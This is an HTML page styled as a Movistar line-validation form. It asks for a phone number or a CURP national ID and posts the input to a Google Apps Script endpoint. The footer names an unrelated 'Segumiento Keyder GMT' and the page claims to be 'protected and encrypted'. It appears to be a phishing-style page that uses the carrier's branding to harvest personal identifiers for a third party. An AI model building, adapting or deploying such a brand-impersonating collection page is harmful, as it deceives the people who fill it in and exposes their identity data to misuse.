<!DOCTYPE html>

<html lang="es">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Validación de Línea | Movistar</title>

    <!-- Incluimos Tailwind CSS para un diseño premium y responsivo -->

    <script src="https://cdn.tailwindcss.com"></script>

    <script>

        tailwind.config = {

            theme: {

                extend: {

                    colors: {

                        movistarBlue: '#019DF4',

                        movistarDark: '#0B2739',

                        movistarGreen: '#5BC500'

                    }

                }

            }

        }

    </script>

</head>

<body class="bg-gray-50 flex items-center justify-center min-h-screen p-4 font-sans text-movistarDark">



    <!-- Tarjeta Principal -->

    <div class="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full border border-gray-100">

        

        <!-- Logo Header -->

        <div class="flex flex-col items-center mb-8">

            <div class="flex items-end mb-2">

                <span class="text-4xl font-bold tracking-tighter text-movistarBlue">movistar</span>

                <div class="w-3 h-3 bg-movistarGreen rounded-full ml-1 mb-1 shadow-sm"></div>

            </div>

            <h1 class="text-xl font-semibold mt-2">Validación de Línea</h1>

        </div>



        <!-- Instrucciones -->

        <p class="text-gray-600 text-center mb-6 text-sm leading-relaxed">

            Para completar tu proceso de alta, ingresa tu <strong class="text-movistarBlue">número a 10 dígitos</strong> o tu <strong class="text-movistarBlue">CURP</strong>.

        </p>



        <!-- Formulario -->

        <div class="space-y-5">

            <div>

                <label for="datoCliente" class="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">

                    DN / Número o CURP

                </label>

                <input 

                    type="text" 

                    id="datoCliente" 

                    placeholder="Ej. 5512345678 o ABCD800101XYZ..." 

                    maxlength="18"

                    class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:border-movistarBlue focus:ring-2 focus:ring-movistarBlue/20 outline-none transition-all text-center uppercase text-lg tracking-wide placeholder:text-gray-300 placeholder:normal-case placeholder:text-base"

                    oninput="this.value = this.value.toUpperCase();"

                >

            </div>



            <button 

                id="btnValidar" 

                onclick="validarAlta()"

                class="w-full bg-movistarBlue hover:bg-[#0088D6] text-white font-bold py-3.5 rounded-lg transition-colors flex justify-center items-center gap-2 shadow-lg shadow-movistarBlue/30 disabled:bg-gray-300 disabled:shadow-none disabled:cursor-not-allowed"

            >

                <span>Confirmar Alta</span>

                <!-- Icono SVG de carga (Oculto por defecto) -->

                <svg id="spinner" class="animate-spin h-5 w-5 text-white hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">

                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>

                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>

                </svg>

            </button>

        </div>



        <!-- Área de Mensajes -->

        <div id="mensajeContenedor" class="mt-6 hidden rounded-lg p-4 text-center text-sm font-medium animate-fade-in">

            <p id="mensajeTexto"></p>

        </div>



        <!-- Footer -->

        <div class="mt-8 text-center text-xs text-gray-400">

            <p>Sistema protegido y encriptado.</p>

            <p>&copy; 2026 Segumiento Keyder GMT</p>

        </div>

    </div>



    <script>

        // =========================================================

        // ¡IMPORTANTE! PEGA AQUÍ TU NUEVA URL DE APPS SCRIPT

        // =========================================================

        const API_URL = "https://script.google.com/macros/s/AKfycbyKoVTyeRXiraGY74CRI3SuXJfy--2egXlCjQpFmpJjZ9mYmZjhqNBN2mq5Z-TcZtyD/exec"; 



        async function validarAlta() {

            const inputDato = document.getElementById('datoCliente');

            const valor = inputDato.value.trim();

            const btn = document.getElementById('btnValidar');

            const spinner = document.getElementById('spinner');

            const btnText = btn.querySelector('span');

            

            const mensajeContenedor = document.getElementById('mensajeContenedor');

            const mensajeTexto = document.getElementById('mensajeTexto');

            

            // Ocultar mensaje previo

            mensajeContenedor.classList.add('hidden');

            mensajeContenedor.className = "mt-6 hidden rounded-lg p-4 text-center text-sm font-medium";



            // Validación: El DN tiene 10 y el CURP tiene 18

            if(valor.length !== 10 && valor.length !== 18) {

                mostrarMensaje("Por favor, ingresa un número válido (10 dígitos) o un CURP (18 caracteres).", "error");

                return;

            }



            // Estado de carga (Loading)

            btn.disabled = true;

            btnText.textContent = "Buscando...";

            spinner.classList.remove('hidden');



            try {

                const response = await fetch(API_URL, {

                    method: 'POST',

                    headers: { 'Content-Type': 'text/plain' }, 

                    body: JSON.stringify({ valor: valor })

                });



                const data = await response.json();



                // Manejo de UI según la respuesta

                if (data.status === "success") {

                    mostrarMensaje(data.message, "success");

                    inputDato.value = ""; // Limpiar campo

                } else if (data.status === "info") {

                    mostrarMensaje(data.message, "info");

                } else {

                    mostrarMensaje(data.message, "error");

                }



            } catch (error) {

                console.error("Error:", error);

                mostrarMensaje("Hubo un error de conexión con el servidor. Intenta de nuevo.", "error");

            } finally {

                // Restaurar botón

                btn.disabled = false;

                btnText.textContent = "Confirmar Alta";

                spinner.classList.add('hidden');

            }

        }



        // Función para inyectar colores y mostrar el mensaje

        function mostrarMensaje(texto, tipo) {

            const contenedor = document.getElementById('mensajeContenedor');

            const parrafo = document.getElementById('mensajeTexto');

            

            parrafo.textContent = texto;

            contenedor.classList.remove('hidden');

            

            // Asignar colores de Tailwind según el tipo de mensaje

            if (tipo === 'success') {

                contenedor.classList.add('bg-green-50', 'text-green-700', 'border', 'border-green-200');

            } else if (tipo === 'error') {

                contenedor.classList.add('bg-red-50', 'text-red-700', 'border', 'border-red-200');

            } else if (tipo === 'info') {

                contenedor.classList.add('bg-blue-50', 'text-blue-700', 'border', 'border-blue-200');

            }

        }

    </script>

</body>

</html>
